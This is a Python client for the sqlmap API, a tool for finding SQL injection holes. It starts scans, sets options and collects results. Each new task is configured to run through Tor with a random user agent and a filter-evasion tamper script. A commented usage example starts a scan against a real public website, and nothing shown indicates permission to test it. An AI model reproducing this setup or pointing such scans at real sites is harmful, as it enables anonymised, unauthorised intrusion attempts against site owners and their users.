import json
import requests


class Sqlmap:

	def __init__( self, server, port, admin_key ):

		self.api_url	= 'http://{}:{}/'.format( server, port )
		self.admin_key 	= admin_key
		self.taskids	= []

		try:
			self.testServer()
		except:
			self.error()

	def tasklists( self ):

		json_data 		= self.request( '{}admin/{}/list'.format( self.api_url, self.admin_key ) )

		return json_data

	def flush( self ):

		json_data		= self.request( '{}admin/{}/flush'.format( self.api_url, self.admin_key ) )

		return json_data
	def genID( self ):
		
		json_data		= self.request( '{}task/new'.format( self.api_url ) )['taskid']
		options = { 'tor' : True , 'checkTor': True, 'randomAgent': True, 'torPort': 9050, 'torType': 'SOCKS4', 'level': 3, 'tamper': 'space2comment' }
		self.setOptions( json_data, options)
		return json_data
	def deleteTask( self,task_id ):

		json_data 		= self.request( '{}task/{}/delete'.format( self.api_url, task_id ) )

		return json_data
	def listOptions( self,task_id ):
		
		json_data		= self.request( '{}option/{}/list'.format( self.api_url, task_id ) )

		return json_data

	def setOptions( self,task_id, data ):
		
		if type(data) is dict:

			json_data		= self.request( '{}option/{}/set'.format( self.api_url, task_id ), data )
			return True
		return False

	def kill( self,task_id ):

		json_data 		= self.request( '{}scan/{}/kill'.format( self.api_url, task_id ) )

		return json_data['options']
	def status( self,task_id ):

		json_data		= self.request( '{}scan/{}/status'.format( self.api_url, task_id ) )

		return json_data
	def startScan( self,task_id, target ):

		data 			= { 'url': target }
		json_data		=  self.request( '{}scan/{}/start'.format( self.api_url, task_id ), data)

		return json_data
	def getData( self,task_id ):

		json_data		= self.request( '{}scan/{}/data'.format( self.api_url, task_id ) )
		return json_data

	def getLog( self,task_id ):

		json_data		= self.request( '{}scan/{}/log'.format( self.api_url, task_id ) )

		return json_data
	def error( self ):

		raise Exception("Couldn't connect to sqlmap api")

	def testServer( self ):

		if 'Nothing here' in requests.get(self.api_url).text: return True
		return False

	def request( self, url, data=None ):

		if data is not None:
				json_data = requests.post( url , json=(data) , headers={'Content-type': 'application/json'}).json()
				return json_data
		json_data 		= requests.get( url ).json()

		if json_data["success"] == True:
			return json_data
		elif not self.testServer():
			self.error()

"""
sqlmap = Sqlmap('localhost', 8775,'dd09f6ca392fb9dbc81f4b9e18e858cc')
print sqlmap.flush()
taskid = sqlmap.genID()

print sqlmap.startScan(taskid,'www.bible-history.com/subcat.php?id=2')

print sqlmap.tasklists()
"""